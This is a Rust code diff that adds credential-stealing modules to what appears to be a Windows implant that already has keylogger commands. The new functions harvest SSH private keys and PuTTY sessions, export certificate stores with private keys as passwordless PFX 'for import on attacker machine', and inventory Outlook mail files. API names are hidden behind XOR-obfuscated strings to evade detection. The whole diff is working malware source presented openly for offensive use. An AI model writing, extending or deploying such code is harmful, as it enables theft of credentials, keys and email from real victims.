@@ -32,6 +32,9 @@ fn exec_collect_win(task: &Task) -> TaskOutput {
         "keylog-start"   => keylog_start(),
         "keylog-stop"    => keylog_stop(),
         "keylog-dump"    => keylog_dump(),
+        "ssh-keys"       => collect_ssh_keys(),
+        "certs"          => collect_certs(),
+        "email"          => collect_email(),
         other => TaskOutput::failure(&format!("collect: unknown method: {other}")),
     }
 }
@@ -941,5 +944,315 @@ fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
     {
         Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
         Err(e) => Err(e.to_string()),
+    }
+}
+
+// ── SSH key theft ─────────────────────────────────────────────────────────────
+//
+// Collects private key files from common SSH locations and PuTTY registry.
+// Returns JSON: {"files": [{"path": "...", "content_b64": "..."}], "putty_sessions": [...]}
+
+#[cfg(target_os = "windows")]
+fn collect_ssh_keys() -> TaskOutput {
+    use base64::Engine;
+
+    let mut files: Vec<serde_json::Value> = Vec::new();
+
+    // Common SSH key locations
+    let home = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Administrator".into());
+    let search_dirs = [
+        format!("{home}\\.ssh"),
+        "C:\\ProgramData\\ssh".to_string(),
+        format!("{home}\\AppData\\Local\\Temp"),
+    ];
+    let key_names = ["id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "id_rsa.pub",
+        "id_ecdsa.pub", "id_ed25519.pub", "*.pem", "*.ppk", "*.key"];
+
+    for dir in &search_dirs {
+        if let Ok(entries) = std::fs::read_dir(dir) {
+            for entry in entries.filter_map(|e| e.ok()) {
+                let path = entry.path();
+                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_lowercase();
+                let is_key = name.starts_with("id_")
+                    || name.ends_with(".pem")
+                    || name.ends_with(".ppk")
+                    || name.ends_with(".key")
+                    || name == "known_hosts"
+                    || name == "authorized_keys";
+                if is_key {
+                    if let Ok(data) = std::fs::read(&path) {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
+                        files.push(serde_json::json!({
+                            "path": path.to_string_lossy(),
+                            "size": data.len(),
+                            "content_b64": b64
+                        }));
+                    }
+                }
+            }
+        }
+    }
+
+    // PuTTY saved sessions from registry (contains hostnames + usernames)
+    let putty_sessions = collect_putty_sessions();
+
+    let result = serde_json::json!({
+        "ssh_files": files,
+        "putty_sessions": putty_sessions
+    });
+
+    match serde_json::to_vec(&result) {
+        Ok(b)  => TaskOutput::success(b),
+        Err(e) => TaskOutput::failure(&e.to_string()),
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn collect_putty_sessions() -> Vec<serde_json::Value> {
+    use windows_sys::Win32::System::Registry::{
+        RegOpenKeyExA, RegEnumKeyExA, RegQueryValueExA, RegCloseKey,
+    };
+    const HKCU: isize = -2147483647isize;
+    const KEY_READ: u32 = 0x20019;
+
+    let mut sessions = Vec::new();
+    let root_path = std::ffi::CString::new("Software\\SimonTatham\\PuTTY\\Sessions").unwrap();
+    let mut h_root: isize = 0;
+    if unsafe { RegOpenKeyExA(HKCU, root_path.as_ptr() as *const u8, 0, KEY_READ, &mut h_root) } != 0 {
+        return sessions;
+    }
+
+    let mut idx = 0u32;
+    loop {
+        let mut name_buf = [0u8; 512];
+        let mut name_len = 512u32;
+        let r = unsafe { RegEnumKeyExA(h_root, idx, name_buf.as_mut_ptr(), &mut name_len,
+            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut()) };
+        if r != 0 { break; }
+        idx += 1;
+
+        let session_name = String::from_utf8_lossy(&name_buf[..name_len as usize]).to_string();
+        let sub = std::ffi::CString::new(
+            format!("Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}")
+        ).unwrap();
+        let mut h_sess: isize = 0;
+        if unsafe { RegOpenKeyExA(HKCU, sub.as_ptr() as *const u8, 0, KEY_READ, &mut h_sess) } != 0 { continue; }
+
+        let mut read_val = |name: &str| -> String {
+            let n = std::ffi::CString::new(name).unwrap();
+            let mut buf = vec![0u8; 256];
+            let mut len = buf.len() as u32;
+            let mut typ = 0u32;
+            if unsafe { RegQueryValueExA(h_sess, n.as_ptr() as *const u8, core::ptr::null_mut(),
+                &mut typ, buf.as_mut_ptr(), &mut len) } != 0 { return String::new(); }
+            String::from_utf8_lossy(&buf[..len.saturating_sub(1) as usize]).to_string()
+        };
+
+        let hostname  = read_val("HostName");
+        let username  = read_val("UserName");
+        let port      = read_val("PortNumber");
+        let key_file  = read_val("PublicKeyFile");
+        unsafe { RegCloseKey(h_sess) };
+
+        sessions.push(serde_json::json!({
+            "session": session_name,
+            "host": hostname,
+            "user": username,
+            "port": port,
+            "key_file": key_file
+        }));
+    }
+
+    unsafe { RegCloseKey(h_root) };
+    sessions
+}
+
+// ── Certificate theft ─────────────────────────────────────────────────────────
+//
+// Enumerates MY, CA, ROOT cert stores and exports each as a PFX blob
+// (includes private keys where exportable). Returns JSON with per-store
+// cert metadata + base64-encoded PFX for import on attacker machine.
+
+#[cfg(target_os = "windows")]
+fn collect_certs() -> TaskOutput {
+    use base64::Engine;
+    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+
+    let crypt32 = {
+        let mut base = crate::loader::get_module_base(
+            crate::obfs::dec(&[0x39,0x28,0x23,0x2A,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+        ) as isize;
+        if base == 0 {
+            let name = crate::obfs::dec(&[0x39,0x28,0x23,0x2A,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
+            base = unsafe { LoadLibraryA(name.as_ptr()) } as isize;
+        }
+        if base == 0 { return TaskOutput::failure("certs: crypt32 not found"); }
+        base as usize
+    };
+
+    // CertOpenSystemStoreA, CertEnumCertificatesInStore, CertGetNameStringA,
+    // CertCloseStore, PFXExportCertStoreEx
+    type CertOpenFn    = unsafe extern "system" fn(usize, *const u8) -> isize;
+    type CertEnumFn    = unsafe extern "system" fn(isize, *const u8) -> *const u8;
+    type CertNameFn    = unsafe extern "system" fn(*const u8, u32, u32, *const u8, *mut u8, u32) -> u32;
+    type CertCloseFn   = unsafe extern "system" fn(isize, u32) -> i32;
+    type PfxExportFn   = unsafe extern "system" fn(isize, *mut u8, *const u16, *const u8, u32) -> i32;
+
+    macro_rules! load_fn { ($enc:expr, $ty:ty) => { {
+        match unsafe { crate::loader::get_export_by_name(crypt32, crate::obfs::dec($enc).as_ptr()) } {
+            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+            None    => return TaskOutput::failure("certs: fn resolve failed"),
+        }
+    }}}
+
+    // CertOpenSystemStoreA
+    let fn_open = load_fn!(&[0x19,0x3F,0x28,0x2E,0x15,0x2A,0x3F,0x34,0x09,0x23,0x29,0x2E,
+                              0x3F,0x37,0x09,0x2E,0x35,0x28,0x3F,0x1B,0x5A], CertOpenFn);
+    // CertEnumCertificatesInStore
+    let fn_enum = load_fn!(&[0x19,0x3F,0x28,0x2E,0x1F,0x34,0x2F,0x37,0x19,0x3F,0x28,0x2E,
+                              0x33,0x3C,0x33,0x39,0x3B,0x2E,0x3F,0x29,0x13,0x34,0x09,0x2E,
+                              0x35,0x28,0x3F,0x5A], CertEnumFn);
+    // CertGetNameStringA
+    let fn_name = load_fn!(&[0x19,0x3F,0x28,0x2E,0x1D,0x3F,0x2E,0x14,0x3B,0x37,0x3F,0x09,
+                              0x2E,0x28,0x33,0x34,0x3D,0x1B,0x5A], CertNameFn);
+    // CertCloseStore
+    let fn_close = load_fn!(&[0x19,0x3F,0x28,0x2E,0x19,0x36,0x35,0x29,0x3F,0x09,0x2E,0x35,
+                               0x28,0x3F,0x5A], CertCloseFn);
+    // PFXExportCertStoreEx
+    let fn_pfx = load_fn!(&[0x0A,0x1C,0x02,0x1F,0x22,0x2A,0x35,0x28,0x2E,0x19,0x3F,0x28,
+                             0x2E,0x09,0x2E,0x35,0x28,0x3F,0x1F,0x22,0x5A], PfxExportFn);
+
+    let mut stores_out: Vec<serde_json::Value> = Vec::new();
+
+    for store_name in ["MY", "CA", "ROOT"] {
+        let sname: Vec<u8> = store_name.bytes().chain(core::iter::once(0)).collect();
+        let hstore = unsafe { fn_open(0usize, sname.as_ptr()) };
+        if hstore == 0 { continue; }
+
+        // Enumerate for metadata. CERT_CONTEXT x64 layout:
+        //   +0  u32  dwCertEncodingType
+        //   +4  [4]  pad
+        //   +8  *u8  pbCertEncoded
+        //   +16 u32  cbCertEncoded
+        //   +20 [4]  pad
+        //   +24 *u8  pCertInfo
+        //   +32 isize hCertStore
+        let mut certs_meta: Vec<serde_json::Value> = Vec::new();
+        let mut ctx = core::ptr::null::<u8>();
+        loop {
+            ctx = unsafe { fn_enum(hstore, ctx) }; // frees previous ctx
+            if ctx.is_null() { break; }
+
+            let enc_ptr = unsafe { *(ctx.add(8)  as *const *const u8) };
+            let enc_len = unsafe { *(ctx.add(16) as *const u32) };
+
+            let mut subj_buf = [0u8; 512];
+            let ns = unsafe { fn_name(ctx, 4, 0, core::ptr::null(), subj_buf.as_mut_ptr(), 512) };
+            let subject = String::from_utf8_lossy(
+                &subj_buf[..ns.saturating_sub(1) as usize]
+            ).to_string();
+
+            let mut issr_buf = [0u8; 512];
+            let ni = unsafe { fn_name(ctx, 4, 1, core::ptr::null(), issr_buf.as_mut_ptr(), 512) };
+            let issuer = String::from_utf8_lossy(
+                &issr_buf[..ni.saturating_sub(1) as usize]
+            ).to_string();
+
+            let der_b64 = if !enc_ptr.is_null() && enc_len > 0 {
+                let der = unsafe { core::slice::from_raw_parts(enc_ptr, enc_len as usize) };
+                base64::engine::general_purpose::STANDARD.encode(der)
+            } else { String::new() };
+
+            certs_meta.push(serde_json::json!({
+                "subject":     subject,
+                "issuer":      issuer,
+                "cert_der_b64": der_b64
+            }));
+        }
+
+        // CRYPT_DATA_BLOB x64: u32 cb (+0), [4] pad, *mut u8 pb (+8) → 16 bytes total
+        // Two-phase: first call gets required size, second fills the buffer.
+        let pw: Vec<u16> = core::iter::once(0u16).collect(); // empty password
+        let mut blob = [0u8; 16usize];
+        unsafe { fn_pfx(hstore, blob.as_mut_ptr(), pw.as_ptr(), core::ptr::null(), 0x0004) };
+        let cb = u32::from_ne_bytes([blob[0], blob[1], blob[2], blob[3]]);
+        let pfx_b64 = if cb > 0 {
+            let mut buf = vec![0u8; cb as usize];
+            unsafe {
+                *(blob.as_mut_ptr().add(8) as *mut *mut u8) = buf.as_mut_ptr();
+                fn_pfx(hstore, blob.as_mut_ptr(), pw.as_ptr(), core::ptr::null(), 0x0004);
+            }
+            base64::engine::general_purpose::STANDARD.encode(&buf)
+        } else { String::new() };
+
+        unsafe { fn_close(hstore, 0) };
+
+        stores_out.push(serde_json::json!({
+            "store":       store_name,
+            "cert_count":  certs_meta.len(),
+            "certs":       certs_meta,
+            "pfx_b64":     pfx_b64
+        }));
+    }
+
+    let out = serde_json::to_vec(&serde_json::json!({"stores": stores_out}))
+        .unwrap_or_default();
+    TaskOutput::success(out)
+}
+
+// ── Email collection ──────────────────────────────────────────────────────────
+//
+// Walks common Outlook data file locations and returns an inventory of
+// .pst/.ost/.nst files with paths and sizes. Use the file module to pull
+// individual files for offline analysis.
+
+#[cfg(target_os = "windows")]
+fn collect_email() -> TaskOutput {
+    let local_app    = std::env::var("LOCALAPPDATA").unwrap_or_default();
+    let appdata      = std::env::var("APPDATA").unwrap_or_default();
+    let userprofile  = std::env::var("USERPROFILE").unwrap_or_default();
+
+    let roots = [
+        format!("{local_app}\\Microsoft\\Outlook"),
+        format!("{appdata}\\Microsoft\\Outlook"),
+        format!("{userprofile}\\Documents\\Outlook Files"),
+        format!("{userprofile}\\My Documents\\Outlook Files"),
+    ];
+
+    let mut files: Vec<serde_json::Value> = Vec::new();
+    for root in &roots {
+        walk_email(std::path::Path::new(root), &mut files, 4);
+    }
+
+    let out = serde_json::to_vec(&serde_json::json!({"email_files": files}))
+        .unwrap_or_default();
+    TaskOutput::success(out)
+}
+
+#[cfg(target_os = "windows")]
+fn walk_email(dir: &std::path::Path, out: &mut Vec<serde_json::Value>, depth: u32) {
+    if depth == 0 { return; }
+    let Ok(entries) = std::fs::read_dir(dir) else { return };
+    for entry in entries.filter_map(|e| e.ok()) {
+        let path = entry.path();
+        if path.is_dir() {
+            walk_email(&path, out, depth - 1);
+        } else {
+            let name = path.file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("")
+                .to_lowercase();
+            if name.ends_with(".pst") || name.ends_with(".ost") || name.ends_with(".nst") {
+                let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
+                let kind = if name.ends_with(".pst") { "PST" }
+                    else if name.ends_with(".ost") { "OST" }
+                    else { "NST" };
+                out.push(serde_json::json!({
+                    "path":       path.to_string_lossy(),
+                    "size_bytes": size,
+                    "type":       kind
+                }));
+            }
+        }
     }
 }
